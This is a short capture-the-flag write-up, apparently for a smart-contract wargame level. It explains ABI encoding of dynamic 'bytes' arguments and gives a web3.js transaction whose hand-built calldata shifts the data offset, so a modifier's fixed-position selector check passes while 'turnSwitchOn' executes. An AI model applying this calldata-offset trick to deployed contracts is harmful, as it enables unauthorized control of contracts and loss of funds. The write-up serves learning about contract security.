### References
- [Use of Dynamic Types](https://docs.soliditylang.org/en/latest/abi-spec.html#use-of-dynamic-types)
- [EVM opcode docs](https://www.ethervm.io/#37)

## Key Observation

Dynamic input types encoding is as following:
- First word (32 bytes) holds the `offset` of start of the data (i.e. the start index of the `length` word).
- Second word (32 bytes) holds the `length` of the dynamic data in bytes.
- Following bytes contain the data itself.


In our case, `flipSwitch` function accepts a single dynamic type `bytes`.
<br>
So, the **"normal"** value for `offset` would be 32, and the `data` would start in position 68 (after the 2 words containing `offset` and `length`, not counting the first 4 bytes of the `method signature`).

## The Exploit

We can change edit the `offset` to a higher number after the first 72 bytes of `calldata` (i.e. 68 bytes if we don't count the first 4 bytes of `method signature`).
<br>
This way we **shift** the data to follow the first 72 bytes that will be used to pass the modifier's validation.

##

```js
// Note: When 
await web3.eth.sendTransaction({
    from: player,
    to: contract.address,
    data:
        web3.utils.sha3('flipSwitch(bytes)').substring(0, 10) +                 // "flipSwitch" signature       (4 bytes)
        web3.eth.abi.encodeParameter('uint256', '68').substring(2) +            // bytes _data offset           (32 bytes)
        web3.eth.abi.encodeParameter('uint256', '0').substring(2) +             // unused word                  (32 bytes)
        web3.utils.sha3('turnSwitchOff()').substring(0, 10).substring(2) +      // "turnSwitchOff" signature    (4 bytes)
        web3.eth.abi.encodeParameter('uint256', '4').substring(2) +             // bytes _data length           (32 bytes)
        web3.utils.sha3('turnSwitchOn()').substring(0, 10).substring(2),        // "turnSwitchOn" signature     (4 bytes)
})
```
